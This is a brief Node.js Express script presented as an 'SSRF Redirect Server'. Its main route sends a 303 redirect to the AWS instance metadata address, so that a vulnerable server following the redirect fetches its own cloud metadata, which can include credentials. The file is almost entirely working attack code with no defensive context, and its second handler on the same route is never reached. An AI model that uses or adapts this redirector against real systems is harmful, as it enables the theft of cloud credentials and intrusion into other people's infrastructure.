const express = require("express");

const app = express();
const PORT = 3000; // Change port if needed

// Route to trigger SSRF via 303 redirect
app.get("/", (req, res) => {
  res.status(303).set("Location", "http://169.254.169.254/latest/meta-data/").send();
  console.log("Redirecting to AWS Metadata...");
});

// Generic route to return a message
app.get("/", (req, res) => {
  res.send("SSRF Redirect Server is running.");
});

// Start server
app.listen(PORT, () => {
  console.log(`SSRF Redirect Server running on http://localhost:${PORT}`);
});
